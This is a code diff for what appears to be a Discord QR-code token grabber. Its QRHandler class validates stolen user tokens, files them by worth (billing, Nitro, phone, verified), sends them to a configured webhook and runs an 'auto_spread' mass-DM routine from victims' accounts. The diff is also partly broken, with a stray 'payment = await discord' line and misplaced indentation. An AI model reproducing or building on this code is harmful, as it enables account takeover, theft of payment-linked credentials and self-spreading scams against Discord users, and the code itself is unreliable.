@@ -6,16 +6,12 @@ from . DRAclient import DRAClient
 import io
 import qrcode
 import discord
-from . DiscordLib import DiscordLib, MassDM
 import asyncio
 from discord.utils import get
 from datetime import datetime
 from colorama import Fore
 import config
-from . DiscordLib import MassDM
-import random
-
-
+import DiscordLib
 
 
 async def generate_qr(fingerprint):
@@ -74,55 +70,57 @@ class QRHandler():
             f.write(token + '\n')
 
 
-    async def check_token(self, token):
-        details = await DiscordLib().get_details(token)
+    async def check_token(self, user):
+        details = await DiscordLib().get_details(user.token)
         try:
             if details['message'] == '401: Unauthorized':
                 return
         except KeyError:
             pass
 
-            await self.save_token(token, "tokens")
-
-        if await DiscordLib().get_payment(token):
-            await self.save_token(token, "billing")
+            await self.save_token(user.token, "tokens")
+        payment = await discord
+        if await DiscordLib().get_payment(user.token):
+            await self.save_token(user.token, "billing")
             return
 
         try:
             if details['premium_type'] == 2:
-                await self.save_token(token, "nitro")
+                await self.save_token(user.token, "nitro")
                 return
             elif details['premium_type'] == 1:
-                await self.save_token(token, "nitroclassic")
+                await self.save_token(user.token, "nitroclassic")
                 return
         except KeyError:
             pass
                     
         if details['phone']:
-            await self.save_token(token, "mobile")
+            await self.save_token(user.token, "mobile")
             return
         if details['verified']:
             self.useless = True
-            await self.save_token(token, "verified")
+            await self.save_token(user.token, "verified")
             return
 
         
-    class LUser:
-        def __init__(self):
-            self.username = None
-            self.user_id = None
-            self.token = None
-            self.email = None
-            self.mfa = None
-            self.nitro = None
-            self.billing = None
-            self.relationships = None
-            self.guilds = None
-            self.logged_from = None
+class LUser:
+    def __init__(self):
+        self.username = None
+        self.user_id = None
+        self.token = None
+        self.email = None
+        self.mfa = None
+        self.nitro = None
+        self.billing = None
+        self.relationships = None
+        self.guilds = None
+        self.logged_from = None
 
             
     async def export_token(self, token):
-        await self.check_token(token)
+        user = LUser()
+        user.token = token
+        await self.check_token(user)
 
         if config.config['webhook_url']:
             try:
@@ -142,7 +140,7 @@ class QRHandler():
             print(f'{Fore.RED}[Error] Failed to add role to user, try making sure the role id is correct in config.config.json')
 
     async def auto_spread(self):
-        massdm = MassDM()
+        massdm = DiscordLib.MassDM()
         await massdm.init(self.client.token, f'{self.client.user.username}#{self.client.user.discrim}')
 
         if self.useless:
